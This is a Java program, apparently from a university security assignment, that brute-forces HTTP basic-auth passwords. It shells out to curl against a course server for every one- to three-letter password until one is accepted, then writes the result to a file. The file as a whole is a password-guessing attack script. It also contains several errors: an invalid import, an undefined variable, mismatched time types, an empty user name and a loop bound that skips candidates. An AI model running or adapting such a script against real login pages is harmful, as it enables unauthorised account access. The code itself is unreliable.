

import java.net.*;
import java.io.*;
import java.String;
import java.*;
import java.util.*;

public class BruteForce {
  private static final int passwdLength = 3;      
  private static String commandLine
       = "curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :";
  private String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  private int charLen = chars.length();           
  private int n = 0;                              
  private int n3 = charLen*charLen*charLen;       
  private String response;
  private String[] password = new String[charLen*charLen*charLen+charLen*charLen+charLen];
  private char[][] data = new char[passwdLength][charLen];
  private char[] pwdChar2 = new char[2];
  private char[] pwdChar = new char[passwdLength];
  private String url;
  private int startTime;
  private int endTime;
  private int totalTime;
  private float averageTime;
  private boolean finish;
  private Process curl;
  private BufferedReader bf, responseLine;

  public BruteForce() {

  first();
  finish = true;
  charLen = chars.length();
  for(int i=0; i<charLen; i++)
   for(int j=0; j<passwdLength; j++)
   {
    data[j][i] = chars.charAt(i);
   }
  Runtime run = Runtime.getRuntime();
  n = 0;

  
  for(int i=0; i<charLen; i++)
  {
    password[n++] = chars.substring(i,i+1);
  }

  
   for(int j=0; j<charLen; j++)
     for(int k=0; k<charLen; k++)
     {
       pwdChar2[0] = data[0][j];
       pwdChar2[1] = data[1][k];
       password[n++] = String.copyValueOf(pwdChar2);
     }

  
  for(int i=0; i<charLen; i++)
   for(int j=0; j<charLen; j++)
     for(int k=0; k<charLen; k++)
     {
       pwdChar[0] = data[0][i];
       pwdChar[1] = data[1][j];
       pwdChar[2] = data[2][k];
       password[n++] = String.copyValueOf(pwdChar);
     }
  n = 0;
  startTime = new Date().getTime();         
  try {
   while(true) {
    url = commandLine+password[n++];
    if(n>=n3) {
     System.out.println("\n  not find the password for user .");
     finish = false;
     break;
    }
    curl = run.exec(url);                  
    responseLine = new BufferedReader(new InputStreamReader(curl.getInputStream()));
    response = responseLine.readLine();
    
    
    if(response.substring(9,12).equals("200")) break;
    responseLine = null;
   }
  }
  catch(IOException ioe){
    System.out.println("\n IO Exception! \n");
    System.out.println("The current url is:"+ url);
    System.out.println("The current trying password is:"+password[n-1]);
    finish=false;
  }

  endTime = new Date().getTime();          
  totalTime = (endTime-startTime)/1000;
  System.out.println("   The response time is:"+ totalTime + "  seconds\n");
  if(finish) {
    System.out.println("   The password for  is:"+ password[n-1]);
    try {
    savePassword(password[n-1], totalTime);
    }
    catch (IOException ioec) {
       System.out.println("  not save the password  file BruteForce_pwd.txt ");
    }
  }
  }

  public void first() {

    System.out.println("\n\n---------------------------------------------------------------");
    System.out.println("  Use curl command  Brute Force the password for user .");
    System.out.println("   Attention: curl should  able  run at your directory");
    System.out.println("          without setting the Path for it.");
    System.out.println("---------------------------------------------------------------");
  }


  public void savePassword(String passwdString, int time) throws IOException {
  DataOutputStream outputStream = new DataOutputStream(new FileOutputStream("BruteForce_pwd.txt"));
  outputStream.writeChars("The password is:");
  outputStream.writeChars(passwdString+"\n");
  outputStream.writeChars("The response time is: ");
  outputStream.writeChars(time1.toString(time));
  outputStream.writeChars(" seconds\n");
  outputStream.close();
  }

  public static void main(String[] args) {
   new BruteForce();
  }  
}
